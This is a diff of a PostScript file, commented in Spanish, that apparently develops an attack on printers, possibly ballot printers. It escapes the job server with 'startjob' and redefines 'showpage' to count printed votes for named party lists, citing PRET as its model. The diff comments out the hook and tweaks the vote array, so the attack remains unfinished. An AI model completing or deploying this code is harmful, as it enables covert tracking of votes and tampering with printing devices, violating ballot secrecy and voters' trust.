@@ -14,15 +14,15 @@ true 0 startjob pop
 
 
 % Al redefinir `showpage` hay que poner un valor magico para triggerear las acciones
-/lista1 (PABLO LESCANO) def
-/lista2 (MALAFAMA) def
+%/lista1 (PABLO LESCANO) def
+%/lista2 (MALAFAMA) def
 
-/cantvotos 400 def
+/cantvotos 300 def
 /currvoto 0 def % Las mesas no tienen mas de 400 votantes en general
 /votos cantvotos array def
 
 /pushvoto {
-  votos 0 3 -1 roll % acomodo el stack
+  votos currvoto 3 -1 roll % acomodo el stack
   put % sumo el voto
   /currvoto currvoto 1 add cantvotos mod def % incremento el voto actual
 } def
@@ -36,13 +36,15 @@ true 0 startjob pop
 
 % Podría agregarse algo así a showpage
 % se tiene que construir un ataque similar al de https://github.com/RUB-NDS/PRET
-/showpage {
-  count 0 gt { % Si hay algo en el stack
-    dup        % Lo duplico por las dudas
-    lista1 eq { sumarvoto } if % Si es la lista uno sumo el voto
-    dup
-    lista2 eq { sumarvoto } if % Si es la lista dos sumo el voto
-  } if
-  systemdict /showpage get exec
-} def
+% los cambios no son duraderos dentro del job, así que tendría que imprimir y LUEGO
+% ejecutar el código de voto
+%/showpage {
+%  count 0 gt { % Si hay algo en el stack
+%    dup        % Lo duplico por las dudas
+%    lista1 eq { sumarvoto } if % Si es la lista uno sumo el voto
+%    dup
+%    lista2 eq { sumarvoto } if % Si es la lista dos sumo el voto
+%  } if
+%  systemdict /showpage get exec
+%} def
 
